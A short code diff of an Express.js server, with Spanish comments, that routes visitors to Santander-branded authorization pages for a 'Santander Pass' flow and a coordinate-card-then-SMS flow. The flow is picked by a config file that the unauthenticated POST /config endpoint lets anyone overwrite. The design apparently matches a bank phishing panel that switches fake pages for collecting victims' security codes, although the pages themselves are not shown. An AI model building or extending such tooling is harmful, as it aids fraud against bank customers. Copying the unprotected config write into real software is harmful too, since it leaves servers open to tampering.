@@ -8,34 +8,31 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// Endpoint para leer configuración
+// Leer configuración
 app.get("/config", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
   res.json(cfg);
 });
 
-// Endpoint para guardar configuración
+// Guardar configuración
 app.post("/config", (req, res) => {
   fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
   res.json(req.body);
 });
 
-// Endpoint de autorización dinámico
+// Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
   if(cfg.tipoAutorizacion === "santander"){
+    // Flujo Santander Pass
     res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
     return;
   }
 
   if(cfg.tipoAutorizacion === "coordenadas"){
+    // Flujo Coordenadas → luego SMS
     res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
-    return;
-  }
-
-  if(cfg.tipoAutorizacion === "sms"){
-    res.sendFile(path.join(__dirname, "public", "autorizacion-sms.html"));
     return;
   }
 
